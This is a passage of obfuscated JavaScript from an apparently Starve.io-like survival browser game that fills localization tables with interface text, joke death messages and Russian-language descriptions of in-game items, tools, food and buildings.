			ΔⵠΔ[ⲆⲆΔ.ᐃΔᐃⲆᐃⵠⵠ] = "You are dead ;-;";
			ΔⵠΔ[ⲆⲆΔ.ΔΔⵠⵠⲆⲆᐃ] = "Server cannot find spawn location! Spam the play button!";
			ΔⵠΔ[ⲆⲆΔ.ⵠᐃⵠⲆⵠΔΔ] = "Server is full! Spam the play button!";
			ΔⵠΔ[ⲆⲆΔ.EMPTY] = "Resource is empty";
			ΔⵠΔ[ⲆⲆΔ.ΔᐃⲆᐃⲆⲆⲆ] = "Inventory is full (right-click to empty items)";
			ΔⵠΔ[ⲆⲆΔ.ΔᐃΔⲆᐃⲆⲆ] = " is dead";
			ΔⵠΔ[ⲆⲆΔ.ⲆⲆⲆⲆᐃᐃᐃ] = "This is not the right tool";
			ΔⵠΔ[ⲆⲆΔ.ΔⵠⵠⲆΔⵠᐃ] = "You joined a team";
			ΔⵠΔ[ⲆⲆΔ.ⲆⵠΔⵠᐃᐃΔ] = "You are dead";
			ΔⵠΔ[ⲆⲆΔ.ⵠⲆΔᐃⲆⵠΔ] = " joined the team";
			ΔⵠΔ[ⲆⲆΔ.ᐃᐃⲆᐃᐃΔⲆ] = "Your team was destroyed";
			ΔⵠΔ[ⲆⲆΔ.ΔΔᐃᐃⵠⵠΔ] = "You left the team";
			ΔⵠΔ[ⲆⲆΔ.ⵠⵠⵠⵠⵠⵠᐃ] = " left the team";
			ΔⵠΔ[ⲆⲆΔ.ᐃⵠᐃΔⲆ] = "Someone stole your token :>";
			ΔⵠΔ[ⲆⲆΔ.ᐃⵠᐃⲆⲆⵠⲆ] = "Choose a server";
			ΔⵠΔ[ⲆⲆΔ.ⵠⲆⵠⵠⲆ] = "players";
			ΔⵠΔ[ⲆⲆΔ.ⲆⲆⲆᐃⵠⲆⲆ] = "total players";
			ΔⵠΔ[ⲆⲆΔ.ⲆⵠΔⵠᐃΔᐃ] = "players on this mode";
			ΔⵠΔ[ⲆⲆΔ.ⵠⲆⵠⲆⲆᐃᐃ] = "Coming soon...";
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[505]).placeholder = "Nickname";
			ᐃᐃΔᐃ[0] = ["You were killed for no reason"];
			ᐃᐃΔᐃ[ⵠΔΔ] = ["You starved to death, as the name of the game implies"];
			ᐃᐃΔᐃ[ⲆΔΔⵠ] = ["You froze to death. So sad", "You got hypothermia. Next time, try sitting by a fire instead."];
			ᐃᐃΔᐃ[3] = ["A player killed you whilst telling you to 'git gud.'", "You got murdered by a player. Don't worry, that player will die too, eventually."];
			ᐃᐃΔᐃ[ⲆⵠᐃⲆ] = ["You stayed too close to the fire and burnt to death. Bad idea.", "You died to a fire. Fires hurt you. Go write a story about it."];
			ᐃᐃΔᐃ[5] = ["Your body will become a nest for spider eggs", "A spider killed you. At least it wasn't a rabbit."];
			ᐃᐃΔᐃ[6] = ["The wolf won't starve anymore after eating you", "They aren't dogs. Wolves don't like being pet."];
			ᐃᐃΔᐃ[ΔⲆΔᐃᐃ] = ["The fox was too quick for you", "The fox turned you into a box. Since when do animals have magic powers?"];
			ᐃᐃΔᐃ[ⵠⲆΔⵠᐃ] = ["The bear only wanted a hug.", "The bear was too much to bare. I'm not sorry."];
			ᐃᐃΔᐃ[9] = ["You were burnt to a crisp by a dragon. So sad.", "You got flattened by a dragon. Getting squished is a horrible way to die."];
			ᐃᐃΔᐃ[ⵠⲆⲆᐃⵠ] = ["You jumped into a spike wall. Not a good idea...", "You got killed by a spike wall. Most people are sensible enough not to touch pointy things."];
			ᐃᐃΔᐃ[ⲆⵠΔΔᐃᐃᐃ] = ["Even the ghost can die.", "You failed to be resurrected. This is a game, so you go to life after you die, so..."];
			ᐃᐃΔᐃ[ⵠΔᐃΔᐃ] = ["A bacterium from your raw food killed you. This game is definitely too hard.", "You killed the raw food. It killed you too."];
			ᐃᐃΔᐃ[ⲆⲆⲆΔⲆΔᐃ] = ["You died of thirst. Better drink your own piss."];
			ᐃᐃΔᐃ[ΔⵠⵠⲆⵠᐃᐃ] = ["Did you know starver's mouths are always below water when swimming? Now you know."];
			ᐃᐃΔᐃ[15] = ["Do not worry, the piranha finds you tasty.", "Fun fact: Pirahnas eat people. Including you."];
			ᐃᐃΔᐃ[ⵠⲆᐃⲆᐃΔⲆ] = ["LapaMauve does not plan that you can kill the kraken", "A kraken krak-ed your skull."];
			ᐃᐃΔᐃ[17] = ["Your skin's falling apart, the sun killed you."];
			ᐃᐃΔᐃ[18] = ["Garlic stored in your pockets boiled your brain."];
			ᐃᐃΔᐃ[ᐃΔΔⲆΔ] = ["As a vampire, don't stand near the garlic cloves."];
			ᐃᐃΔᐃ[20] = ["You ate garlic as a vampire, what did you expect?"];
			ᐃᐃΔᐃ[21] = ["Your body wraps itself in thornbushes. As you try to escape, your skin comes off and your heart stops beating."];
			ⲆⲆΔΔⲆ = ⵠ[170];
			ΔⵠᐃⲆⲆⵠⲆ = ["Uuunnnggg... I'm starving", "Need your brain Uuunnnggg...", "Fresh meat here... Uuunnnggg", "Uuunnnggg... You are tasty", ⵠ[200], "Eat... uuunnnggg...", "I can smell blood... Uuunnnggg"]
		};
		var ⲆⲆⵠⵠⵠᐃⵠ = function() {
			ΔⵠΔ[ᐃᐃ.ⲆᐃΔᐃᐃ] = [ⵠ[207]];
			ᐃᐃΔᐃ[22] = [ⵠ[41]];
			ΔⵠΔ[ᐃᐃ.ΔⵠⲆΔⵠ] = [ⵠ[169], ⵠ[59], ⵠ[57]];
			ΔⵠΔ[ⲆⲆΔ.ᐃⲆΔᐃᐃⵠᐃ] = ⵠ[251];
			ΔⵠΔ[ⲆⲆΔ.ΔⵠⵠᐃᐃΔⵠ] = ⵠ[335];
			ΔⵠΔ[ⲆⲆΔ.ΔⵠᐃⲆⲆⲆΔ] = ⵠ[462];
			ΔⵠΔ[ⲆⲆΔ.ⲆᐃΔᐃᐃᐃⵠ] = ⵠ[270];
			ΔⵠΔ[ⲆⲆΔ.POINTS] = ⵠ[250];
			ΔⵠΔ[ⲆⲆΔ.ⵠΔΔᐃᐃᐃⵠ] = ⵠ[165];
			ΔⵠΔ[ⲆⲆΔ.ⲆᐃⵠⵠΔΔΔ] = ⵠ[203];
			ΔⵠΔ[ⲆⲆΔ.ⲆᐃᐃⵠⲆⲆᐃ] = ⵠ[368];
			ΔⵠΔ[ⲆⲆΔ.ΔΔⲆΔⲆᐃⲆ] = ⵠ[538];
			ΔⵠΔ[ⲆⲆΔ.ΔⲆⲆΔᐃⲆᐃ] = ⵠ[208];
			ΔⵠΔ[ᐃᐃ.ᐃΔΔΔⵠ] = [ⵠ[188], ⵠ[439], ⵠ[134]];
			ΔⵠΔ[ᐃᐃ.ᐃᐃΔⲆΔ] = [ⵠ[518], ⵠ[7], ⵠ[449], ⵠ[492]];
			ΔⵠΔ[ᐃᐃ.ΔⲆⲆⲆⲆ] = [ⵠ[287], ⵠ[194], ⵠ[393], ⵠ[489], ⵠ[68], ⵠ[388]];
			ΔⵠΔ[ᐃᐃ.ⲆⲆⲆⲆΔ] = [ⵠ[295], ⵠ[577], ⵠ[527], ⵠ[425], ⵠ[463]];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[219])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[249];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[546])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[286];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[185])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[220];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[136])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[355];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[579])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[485];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[327])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[441];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[322])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[390];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[514])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[296];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[334])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[242];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[233])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[217];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[179])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[230];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[109])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[45];
			for (var ⵠᐃ = ΔΔⵠ; ⵠᐃ < 7; ⵠᐃ++) document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[ᐃᐃⲆΔΔⲆᐃ] + ⵠᐃ)[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[451];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[487])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[309];
			ΔⵠΔ[ᐃᐃ.ᐃⲆᐃΔᐃ] = ["Рука"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠΔⲆᐃ] = ["Земля", "Грязно!"];
			ΔⵠΔ[ᐃᐃ.ΔⲆⲆΔⵠ] = ["Песок", "Он в моих глазах!"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⲆᐃ] = ["Дерево", "Постоянно нужно больше!"];
			ΔⵠΔ[ᐃᐃ.ᐃᐃΔⲆ] = ["Камень", "Твердый"];
			ΔⵠΔ[ᐃᐃ.ΔⲆⵠⵠ] = ["Золото", "Будьте щедры, давайте его другим"];
			ΔⵠΔ[ᐃᐃ.ΔⲆᐃΔ] = ["Алмаз", "Что вы создадите с помощью него?"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠΔⲆ] = ["Аметист", "Он сиреневый, как Lapa"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃⲆⵠᐃ] = ["Мука", "Используется в готовке"];
			ΔⵠΔ[ᐃᐃ.ΔⵠⲆᐃᐃ] = ["Печенье", "Превосходное бабушкино печенье", "Еда: 50"];
			ΔⵠΔ[ᐃᐃ.ⲆΔΔⲆᐃ] = ["Торт", "Торт мечты для гурманов", "Еда: 100"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆᐃⲆⵠ] = ["Сырое Мясо", "Ты можешь пожарить его с помощью огня", "Вызывает отравление: 10", "Еда: 15"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃⲆⲆⲆ] = ["Жареное Мясо", "Превосходный стейк, пожалуйста", "Еда: 35"];
			ΔⵠΔ[ᐃᐃ.ᐃΔΔΔΔ] = ["Сырая Рыба", "Я думаю она всё ещё жива", "Вызывает отравление: 10", "Еда: 18"];
			ΔⵠΔ[ᐃᐃ.Ⲇⵠᐃᐃⵠ] = ["Жареная рыба", "С лимоном она прекрасна", "Еда: 35"];
			ΔⵠΔ[ᐃᐃ.ⲆΔⵠΔⲆ] = ["Хлеб", "Прекрасный французский хлеб", "Это валюта, используемая на рынке", "Еда: 15"];
			ΔⵠΔ[ᐃᐃ.ΔⵠⲆⵠⵠ] = ["Бутерброд", "На вкус как Крабсбургер", "Еда: 100"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⵠᐃⲆ] = ["Конфеты", "Только для детей!", "Еда: 20"];
			ΔⵠΔ[ᐃᐃ.ΔᐃⲆⵠⲆ] = ["Сахарная Трость", "Попробуйте это, это вкусно", "Еда: 100"];
			ΔⵠΔ[ᐃᐃ.ᐃⲆⲆⲆᐃ] = ["Гирлянда", "Прекрасная декорация для крыши"];
			ΔⵠΔ[ᐃᐃ.ⵠΔⵠᐃΔ] = ["Семя Ягоды", "Вырастает в ягоды", "Рождение: 2мин", "Рост: 55сек", "Нужна вода: 3мин 20сек", ⵠ[294], ⵠ[457]];
			ΔⵠΔ[ᐃᐃ.ⵠⲆΔⲆⲆ] = ["Ягода", "Ягода вкусная!", "Еда: 10"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠⲆΔⲆ] = ["Пшеничное Семя", "Вырастает в пшеницу", "Рождение: 2мин", "Рост: 16сек", "Нужна вода: 2мин", ⵠ[294], ⵠ[457]];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⲆⲆⵠ] = ["Дикая Пшеница", "Перемалывается в муку, когда помещается в мельницу"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠΔⲆⵠ] = ["Семена Тыквы", "Вырастает в тыкву", "Рождение: 2мин 40сек", "Рост: 2мин", "Нужна вода: 2мин", ⵠ[294], ⵠ[457]];
			ΔⵠΔ[ᐃᐃ.ⲆⲆⵠΔΔ] = ["Тыква", "Это напоминает мне Хеллоуин", "Еда: 30"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⲆⵠⲆ] = ["Семена Чеснока", "Очень опасно для вампиров", "Урон: 20", "Рождение: 4мин", "Рост: 4 мин", "Нужна вода: 1мин 40сек", ⵠ[294], ⵠ[457]];
			ΔⵠΔ[ᐃᐃ.ⲆΔⵠΔⵠ] = ["Чеснок", "Лечит и снижает получаемый холод", "Еда: 14", "Лечит: 30", "Эффект: 1"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠᐃⵠⲆ] = ["Семена Колючего Куста", "Может нанести урон врагам", "Урон: 20", "Рождение: 4мин", "Рост: 15сек", "Нужна вода: 3мин", ⵠ[539], ⵠ[457]];
			ΔⵠΔ[ᐃᐃ.ᐃⵠᐃΔΔ] = ["Колючий Куст", "Это больно!"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃΔⲆⲆ] = ["Грядка", "Серьезно, используйте это.", "С этим ГМО удобрением ваши растения", "будут расти быстрее и потребуют меньше воды", ⵠ[190]];
			ΔⵠΔ[ᐃᐃ.ᐃⵠⲆⲆΔ] = ["Лёд", "Используется для изготовления тортов и воды"];
			ΔⵠΔ[ᐃᐃ.ΔΔᐃⲆΔ] = ["Гаечный Ключ", "Для починки дверей, стен, колючек", ⵠ[570]];
			ΔⵠΔ[ᐃᐃ.ΔᐃᐃᐃΔ] = ["Шкура Волка", "Щенок? Но где же Щенок?!"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃⵠⲆᐃ] = ["Шкура Зайца", "Этот кролик был таким милым..."];
			ΔⵠΔ[ᐃᐃ.ΔⲆⵠᐃⲆ] = ["Чистая Шкура", "Вы - фабрика хлеба"];
			ΔⵠΔ[ᐃᐃ.ΔⲆΔⵠΔ] = ["Чёрная Шкура", "Вы готовы делать зло."];
			ΔⵠΔ[ᐃᐃ.ᐃⲆΔⲆⲆ] = ["Зимняя Шкура", "Эти животные просто хотели обнять тебя..."];
			ΔⵠΔ[ᐃᐃ.ⲆⲆⲆᐃᐃ] = ["Чешуя", "Она пахнет рыбой!"];
			ΔⵠΔ[ᐃᐃ.ᐃⲆᐃⲆᐃ] = ["Шкура Кракена", "Вы не испугались?"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆΔᐃΔ] = ["Костёр", "Согрейтесь!", "Прочность: 150", "Продолжительность: 2мин"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠⵠⵠⲆ] = ["Большой Костёр", "Согрейтесь больше!", "Прочность: 400", "Продолжительность: 6мин"];
			ΔⵠΔ[ᐃᐃ.ᐃⲆⲆΔᐃ] = ["Верстак", "Необходим для создания многих предметов"];
			ΔⵠΔ[ᐃᐃ.ᐃᐃᐃΔΔ] = ["Нить", "Используется в изготовлении Шапок и Рюкзака"];
			ΔⵠΔ[ᐃᐃ.ΔΔΔΔᐃ] = ["Алмазная Нить", "Используется в изготовлении специальных шапок"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠⵠᐃⵠ] = ["Сундук", "Позволяет хранить предметы", "Прочность: 500"];
			ΔⵠΔ[ᐃᐃ.ΔΔⵠᐃᐃ] = ["Деревянный Меч", "Это работает?", "Урон: 12", "Урон по строениям: 4"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃⵠΔᐃ] = ["Каменный Меч", "Будьте добры к другим", "Урон: 19", "Урон по строениям: 6"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃⲆⵠΔ] = ["Золотой Меч", "Король леса", "Урон: 22", "Урон по строениям: 7"];
			ΔⵠΔ[ᐃᐃ.ᐃΔⵠᐃⵠ] = ["Алмазный Меч", "Ты можешь почувствовать силу", "Урон: 24", "Урон по строениям: 8"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃⲆⲆΔ] = ["Пиратский Меч", "Aррррр!", "Дальность атаки больше чем у нормального меча", "Урон: 24", "Урон по строениям: 8"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠᐃⲆⲆ] = ["Аметистовый Меч", "Сиреневый - самый красивый цвет в мире", "Урон: 27", "Урон по строениям: 9"];
			ΔⵠΔ[ᐃᐃ.ᐃⲆⲆᐃⲆ] = ["Меч Дракона", "Без пощады!", "Урон: 30", "Урон по строениям: 10"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆⵠᐃⵠ] = ["Копьё Дракона", "Убивай всех!", "Урон: 22", "Урон по строениям: 6"];
			ΔⵠΔ[ᐃᐃ.ΔᐃⲆΔⲆ] = ["Деревянная Кирка", "Может добывать только дерево и камень", "Урон: 1"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠᐃⵠΔ] = ["Каменная Кирка", "Может добывать дерево, камень и золото", ⵠ[570]];
			ΔⵠΔ[ᐃᐃ.ΔΔⲆⵠⲆ] = ["Золотая Кирка", "Также может добывать алмазы", "Урон: 3", ⵠ[480]];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⲆΔⲆ] = ["Алмазная Кирка", "Можно добывать всё", "Урон: 4", ⵠ[480]];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⵠΔᐃ] = ["Аметистовая Кирка", "Можно добывать всё, ещё и выглядит красиво!", "Урон: 5", ⵠ[480]];
			ΔⵠΔ[ᐃᐃ.ΔⵠⲆΔⲆ] = ["Каменный молот", ⵠ[72], "Плохо разрушает алмазные и аметистовые здания", ⵠ[570], "Урон по строениям: 20"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃⵠΔⲆ] = ["Золотой Молот", ⵠ[72], "Плохо разрушает аметистовые здания", "Урон: 3", "Урон по строениям: 30"];
			ΔⵠΔ[ᐃᐃ.ᐃᐃᐃⲆⵠ] = ["Алмазный Молот", ⵠ[72], "Урон: 4", "Урон по строениям: 40"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠⵠⲆⵠ] = ["Аметистовый Молот", ⵠ[72], "Урон: 5", "Урон по строениям: 50"];
			ΔⵠΔ[ᐃᐃ.ᐃⵠⵠⵠᐃ] = ["Супер Молот", "У вас есть планы разрушить мир?", "Урон: 12", "Урон по строениям: 70"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆⵠΔⲆ] = ["Деревянное Копьё", "Выглядит как деревянная палочка, но делает больно.", "Урон: 10", "Урон по строениям: 2"];
			ΔⵠΔ[ᐃᐃ.ΔⵠΔΔⲆ] = ["Каменное Копьё", "Начало эволюции!", "Урон: 14", "Урон по строениям: 4"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠⲆΔⲆ] = ["Золотое Копьё", "Осторожно, это больно!", "Урон: 15", "Урон по строениям: 5"];
			ΔⵠΔ[ᐃᐃ.ΔᐃΔΔΔ] = ["Алмазное Копьё", "Вы готовы убивать дракона.", "Урон: 17", "Урон по строениям: 5"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆΔᐃΔ] = ["Аметистовое Копьё", "Драконы больше не пугают вас", "Урон: 18", "Урон по строениям: 6"];
			ΔⵠΔ[ᐃᐃ.ΔⵠⵠΔᐃ] = ["Каменная Лопата", ⵠ[231], ⵠ[558], ⵠ[570]];
			ΔⵠΔ[ᐃᐃ.ΔΔⲆⵠΔ] = ["Золотая Лопата", ⵠ[231], ⵠ[558], "Урон: 3", ⵠ[480]];
			ΔⵠΔ[ᐃᐃ.ⵠᐃΔΔᐃ] = ["Алмазная Лопата", ⵠ[231], ⵠ[558], "Урон: 4", ⵠ[480]];
			ΔⵠΔ[ᐃᐃ.ⵠᐃᐃⲆΔ] = ["Аметистовая Лопата", ⵠ[231], ⵠ[558], "Урон: 5", "Урон по стреониям: 1"];
			ΔⵠΔ[ᐃᐃ.ᐃⵠⵠⲆΔ] = ["Деревянный Шлем", "Лучше чем ничего", "Защита от игроков: 1", "Защита от животных: 4"];
			ΔⵠΔ[ᐃᐃ.ⵠΔΔᐃⲆ] = ["Каменный Шлем", "Вы готовы к битве!", "Защита от игроков: 2", "Защита от животных: 8"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠⲆⵠΔ] = ["Золотой Шлем", "Также известен как шлем жестоких людей", "Защита от игроков: 4", "Защита от животных: 13"];
			ΔⵠΔ[ᐃᐃ.ᐃΔⲆⲆⲆ] = ["Алмазный Шлем", "Не слишком хвастайтесь", "Защита от игроков: 5", "Защита от животных: 19"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠΔⲆΔ] = ["Аметистовый Шлем", "Ты больше ничего не боишься", "Защита от игроков: 6", "Защита от животных: 23"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃⲆⲆⵠ] = ["Шлем Дракона", "Ты покоришь мир", "Защита от игроков: 8", "Защита от животных: 27"];
			ΔⵠΔ[ᐃᐃ.ΔⵠⲆⵠΔ] = ["Шапка Исследователя", "Животные не обращают на вас внимания", "но не шумите!", ⵠ[53]];
			ΔⵠΔ[ᐃᐃ.ΔⵠᐃⲆⲆ] = ["Рождественская Шапка", "Ох-хо-хо, Счастливого Рождества", ⵠ[53]];
			ΔⵠΔ[ᐃᐃ.ΔⲆΔⵠⵠ] = ["Шапка Эльфа", "Не позволяйте себе эксплуатироваться, ведь вы маленький снежный эльф!", ⵠ[53]];
			ΔⵠΔ[ᐃᐃ.ⲆⵠᐃΔΔ] = ["Капюшон", "Вы разбойник", "Вы можете украсть что-то, если", "1) Ночь", "2) Вы ничего не носите", "3)Если вас не тронули в течение восьми секунд", "4) Вы не рядом с огнём", "5) Вы не можете ничего украсть у крестьянской туники", ⵠ[53]];
			ΔⵠΔ[ᐃᐃ.ΔⵠᐃⲆⵠ] = ["Теплые Наушники", "Какая-то маленькая шапка.", ⵠ[53]];
			ΔⵠΔ[ᐃᐃ.ᐃᐃⲆⵠᐃ] = ["Шапка", "Так же называется пальтом.", ⵠ[53]];
			ΔⵠΔ[ᐃᐃ.ⲆⵠΔᐃⲆ] = ["Зимний Шарф и Шапка", "Очень комфортно", "Очень тепло"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆΔⲆᐃ] = ["Крестьянская Туника", "Ваши растения растут быстрее", ⵠ[53]];
			ΔⵠΔ[ᐃᐃ.ΔᐃᐃΔᐃ] = ["Зимний Капюшон", "Вы можете украсть что-то, если", "- Ночь", "- Вы ничего не носите", "- Если вас не тронули в течение четырёх секунд", "- Вы не рядом с огнём", "- Вы не можете ничего украсть у крестьянской туники", ⵠ[53]];
			ΔⵠΔ[ᐃᐃ.ᐃΔⲆᐃⲆ] = ["Зимняя Крестьянская Туника", "Ваши растения растут быстрее", ⵠ[53]];
			ΔⵠΔ[ᐃᐃ.ᐃⲆΔΔⵠ] = ["Акваланг", "Вы быстрее передвигаетесь по воде", "Тепло в воде", "Защита от игроков: 2, Защита от животных: 8"];
			ΔⵠΔ[ᐃᐃ.ΔⵠᐃΔⲆ] = ["Супер Акваланг", "Вы очень быстро передвигаетесь по воде", "Тепло в воде", ⵠ[142]];
			ΔⵠΔ[ᐃᐃ.ⵠⵠⵠΔⵠ] = ["Шар Дракона", "Даётся за квест"];
			ΔⵠΔ[ᐃᐃ.ⵠΔⲆⲆᐃ] = ["Сердце Дракона", "Превращает вас в призрака после смерти!", "Вы призрак на 60 секунд", "Найдите камень воскрешения"];
			ΔⵠΔ[ᐃᐃ.ΔⲆⵠᐃⵠ] = ["Зелёный Драгоценный Камень", "Вы без читов, правильно?"];
			ΔⵠΔ[ᐃᐃ.ΔᐃⲆᐃᐃ] = ["Оранжевый Драгоценный Камень", "Только настоящий пират найдёт это!"];
			ΔⵠΔ[ᐃᐃ.ᐃᐃΔⵠΔ] = ["Синий Драгоценный Камень", "Для очень добрых людей"];
			ΔⵠΔ[ᐃᐃ.Ⲇⵠᐃⵠⵠ] = ["Зеленая корона", "Вы лечите себя очень быстро", "Лечит: 40", ⵠ[142]];
			ΔⵠΔ[ᐃᐃ.ᐃΔⵠⲆⲆ] = ["Оранжевая Корона", "Вам очень повезло", ⵠ[142]];
			ΔⵠΔ[ᐃᐃ.ΔᐃᐃΔΔ] = ["Синяя Корона", "Как только вы умрёте, вы станете призраком", "Но вы потеряете своё оружие", ⵠ[142]];
			ΔⵠΔ[ᐃᐃ.ΔⵠⵠⵠΔ] = ["Ведро", "Используется для заполнения колодца", "Одно ведро равняется двенадцати бутылкам"];
			ΔⵠΔ[ᐃᐃ.Δⵠⵠⵠⵠ] = ["Пустое ведро", "Вам надо заполнить это ведро возле воды"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆᐃᐃᐃ] = ["Бутылка", "Позволяет пить воду в любом месте", "Вода: 50"];
			ΔⵠΔ[ᐃᐃ.ᐃᐃⲆⲆᐃ] = ["Пустая бутылка", "Вы можете заполнить бутылку возле воды"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃⲆᐃⵠ] = ["Пустая Лейка", "Вы можете заполнить лейку возле воды"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⲆⵠⵠ] = ["Лейка", "Позволяет поливать растения", "Урон: 1"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃᐃⵠ] = ["Рюкзак", "Больше места для ваших предметов!"];
			ΔⵠΔ[ᐃᐃ.ⵠΔⵠΔⲆ] = ["Бумага", "Используется при создании книги"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠⲆⵠⲆ] = ["Книга", "Сокращает время изготовления предметов", "Должно быть одето для работы", "Урон: 1"];
			ΔⵠΔ[ᐃᐃ.ΔΔⵠⵠᐃ] = ["Бинт", "Восстанавливает ваше здоровье быстрее", "Лечит: 30", "Эффект: 5"];
			ΔⵠΔ[ᐃᐃ.ΔΔΔⵠᐃ] = ["Замок", "Позволяет вам закрыть ваш сундук"];
			ΔⵠΔ[ᐃᐃ.ΔⵠΔⵠΔ] = ["Ключ", "Даёт вам открыть один запертый сундук"];
			ΔⵠΔ[ᐃᐃ.ⲆΔᐃⲆᐃ] = ["Тотем", "Позволяет вам создать команду", "Совместное использование дверей и сундуков", "Вредное здание не повредит вашего друга"];
			ΔⵠΔ[ᐃᐃ.ΔⲆΔⲆᐃ] = ["Мост", "Очень полезно на воде", "Позволяет вам пить без потери воздуха", "Передвигаетесь быстрее по воде"];
			ΔⵠΔ[ᐃᐃ.ᐃⵠᐃⲆᐃ] = ["Табличка", "Оставьте сообщение другим", "Прочность: 200"];
			ΔⵠΔ[ᐃᐃ.ⵠΔⲆᐃⵠ] = ["Крыша", "Немного скрывает вас и согревает!"];
			ΔⵠΔ[ᐃᐃ.ΔⲆᐃΔⵠ] = ["Колодец", "Позволяет заполнить бутылку", ⵠ[539]];
			ΔⵠΔ[ᐃᐃ.ⲆΔΔⵠᐃ] = ["Деревянная Стена", "Это просто стена", ⵠ[539]];
			ΔⵠΔ[ᐃᐃ.ΔⵠΔⲆⲆ] = ["Каменная Стена", "Это немного посерьезнее.", "Прочность: 1500"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃᐃΔⲆ] = ["Золотая Стена", "Золото на ваших стенах? Она ослепляет.", ⵠ[190]];
			ΔⵠΔ[ᐃᐃ.ⲆΔⲆᐃᐃ] = ["Алмазная Стена", "Очень блестит, следите за вашими глазами", "Прочность: 2500"];
			ΔⵠΔ[ᐃᐃ.ᐃΔᐃΔⵠ] = ["Аметистовая стена", "Вы должны быть слишком напуганы, чтобы уйти!", "Прочность: 3500"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠⵠΔⲆ] = ["Деревянная Стена с Шипами", "Может наносить урон врагам", "Урон: 10, Урон за один удар: 2", "Прочность: 150"];
			ΔⵠΔ[ᐃᐃ.ⲆΔᐃΔᐃ] = ["Каменная Стена с Шипами", "Я не хотел бы быть вашим врагом", "Урон: 20", "Урон за один удар: 3", "Прочность: 300"];
			ΔⵠΔ[ᐃᐃ.ⲆΔⲆⵠΔ] = ["Золотая Стена с Шипами", "Вы очень жестоки.", "Урон: 30", "Урон за один удар: 3", "Прочность: 600"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆΔⵠⲆ] = ["Алмазная Стена с Шипами", "Вам не нравится иметь компанию.", "Урон: 40", "Урон за один удар: 4", "Прочность: 1200"];
			ΔⵠΔ[ᐃᐃ.ΔⲆⵠⵠᐃ] = ["Аметистовая Стена с Шипами", "Какого черта, что ваши соседи сделали с вами?", "Урон: 50", "Урон за один удар: 4", "Прочность: 2400"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃᐃⵠᐃ] = ["Деревянная Дверь", "Может быть открыта и закрыта вами или друзьями", ⵠ[539]];
			ΔⵠΔ[ᐃᐃ.ⲆΔⵠΔΔ] = ["Каменная Дверь", "Более серьезная и сильная дверь", "Прочность: 1500"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃⵠⵠᐃ] = ["Золотая Дверь", 'Вы перестраиваете "Эль Дорадо?"', ⵠ[190]];
